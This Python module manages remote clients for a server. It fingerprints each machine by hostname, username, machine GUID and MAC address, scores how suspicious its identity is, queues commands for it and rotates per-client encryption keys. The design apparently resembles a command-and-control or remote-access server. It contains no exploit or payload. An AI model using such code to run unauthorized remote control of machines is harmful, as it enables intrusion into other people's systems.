import os
import base64
import logging
from datetime import datetime
from utils.client_identity import extract_system_info

logger = logging.getLogger(__name__)

class ClientHelper:
    """Handles client identification, verification, and command management"""
    
    def __init__(self, client_manager, crypto_helper, server):
        self.client_manager = client_manager
        self.crypto_helper = crypto_helper
        self.server = server
    
    def identify_client(self, client_ip, headers, system_info_encrypted=None):
        """
        Identify a client based on headers and system info
        
        Returns:
            tuple: (client_id, system_info, newly_identified)
        """
        client_identifier = headers.get('X-Client-ID')
        client_rotation_id = headers.get('X-Rotation-ID')
        
        identified_client_id = None
        system_info = {}
        newly_identified = False
        
        if system_info_encrypted:
            try:
                # Decrypt the system information
                system_info_json = self.crypto_helper.crypto_manager.decrypt(system_info_encrypted)
                
                # Extract key system properties
                hostname, username, machine_guid, os_version, mac_address, system_info = extract_system_info(system_info_json)
                
                # Add IP to system info
                system_info['ip'] = client_ip
                
                # Add unique client identifier if provided
                if client_identifier:
                    system_info['client_identifier'] = client_identifier
                    
                    # Check if this client_identifier is already known
                    for existing_id, client_info in self.client_manager.get_clients_info().items():
                        if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                            identified_client_id = existing_id
                            logger.info(f"Recognized returning client with identifier {client_identifier} as {identified_client_id}")
                            break
                
                # If we identified the client by identifier, use that ID, otherwise register as new
                if not identified_client_id:
                    client_id = self.client_manager.add_client(
                        ip=client_ip,
                        hostname=hostname,
                        username=username,
                        machine_guid=machine_guid,
                        os_version=os_version,
                        mac_address=mac_address,
                        system_info=system_info
                    )
                    newly_identified = True
                else:
                    # Update the existing client information
                    client_id = identified_client_id
                    self.client_manager.add_client(
                        ip=client_ip,
                        hostname=hostname,
                        username=username,
                        machine_guid=machine_guid,
                        os_version=os_version,
                        mac_address=mac_address,
                        system_info=system_info
                    )
                
                logger.info(f"Client identified as {client_id} ({hostname}/{username})")
                
            except Exception as e:
                logger.error(f"Error processing system information: {str(e)}")
                # Fall back to IP-based identification
                client_id = client_ip
                self.client_manager.add_client(client_id)
                newly_identified = True
        else:
            # Fall back to IP-based identification for compatibility
            client_id = client_ip
            self.client_manager.add_client(client_id)
            newly_identified = True
            
        return client_id, system_info, newly_identified

    def verify_client(self, client_id, system_info):
        """
        Verify client identity using the server's client_verifier
        
        Returns:
            tuple: (is_verified, confidence, needs_key_rotation, warnings)
        """
        needs_key_rotation = False
        
        # Default values if verification is not possible
        is_verified = False
        confidence = 0
        warnings = ["Verification not performed"]
        
        # Verify client identity if verifier is available
        if hasattr(self.server, 'client_verifier') and self.server.client_verifier:
            verifier = self.server.client_verifier
            is_verified, confidence, warnings = verifier.verify_client(client_id, system_info)
            
            # Add logging for verification status
            logger.info(f"Verification result for {client_id}: verified={is_verified}, confidence={confidence}")
            
            # Update client verification status
            self.client_manager.set_verification_status(client_id, is_verified, confidence, warnings)
            
            # Check if client needs key rotation
            has_unique_key = self._has_unique_key(client_id)
            
            # Check for manual key rotation request 
            requested_key_rotation = any(
                cmd.get('command_type') == 'key_rotation' 
                for cmd in self.client_manager.get_pending_commands(client_id)
            )

            # Decide if key rotation is needed
            needs_key_rotation = (is_verified and (not has_unique_key or requested_key_rotation))
            
            if requested_key_rotation:
                logger.info(f"Manual key rotation requested for client {client_id}")
                
            if not is_verified:
                warning_str = ", ".join(warnings)
                logger.warning(f"Client {client_id} identity suspicious (confidence: {confidence:.1f}%): {warning_str}")
            
            # Register/update this client information for future reference
            verifier.register_client(client_id, system_info)
            
        return is_verified, confidence, needs_key_rotation, warnings
    
    def _has_unique_key(self, client_id):
        """Check if client has a unique encryption key"""
        if hasattr(self.client_manager, 'has_unique_key'):
            return self.client_manager.has_unique_key(client_id)
        else:
            # Fallback to direct check
            return hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys
    
    def prepare_key_rotation(self, client_id):
        """
        Prepare a key rotation command for the client
        
        Returns:
            dict: Key rotation command object
        """
        # Generate a new unique key for this client
        new_key = os.urandom(32)  # 256-bit key
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Store the client's unique key
        self.client_manager.set_client_key(client_id, new_key)
        
        # Create key rotation command
        key_rotation_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_rotation",
            "args": base64_key
        }
        
        logger.info(f"Key rotation command issued for client {client_id}")
        
        return key_rotation_command
    
    def organize_commands(self, client_id, include_key_rotation=False):
        """
        Organize commands for client including key rotation if needed
        
        Args:
            client_id: Client identifier
            include_key_rotation: Whether to include key rotation command
            
        Returns:
            tuple: (commands, has_key_rotation)
        """
        commands = self.client_manager.get_pending_commands(client_id)
        has_key_rotation = False
        
        # Move any key rotation commands to the front
        for i, command in enumerate(commands):
            if command.get('command_type') == 'key_rotation':
                has_key_rotation = True
                if i > 0:  # Move to front if not already there
                    commands.insert(0, commands.pop(i))
                break
        
        # Add key rotation command if needed and not already present
        if include_key_rotation and not has_key_rotation:
            key_rotation_command = self.prepare_key_rotation(client_id)
            commands.insert(0, key_rotation_command)
            has_key_rotation = True
        
        return commands, has_key_rotation
    
    def clear_commands_after_rotation(self, client_id):
        """Clear key rotation commands but keep other commands"""
        pending_commands = self.client_manager.get_pending_commands(client_id)
        non_rotation_commands = [cmd for cmd in pending_commands if cmd.get('command_type') != 'key_rotation']
        
        # Clear all commands then add back non-rotation ones
        self.client_manager.clear_pending_commands(client_id)
        
        for cmd in non_rotation_commands:
            self.client_manager.add_command(
                client_id, 
                cmd.get('command_type'), 
                cmd.get('args')
            )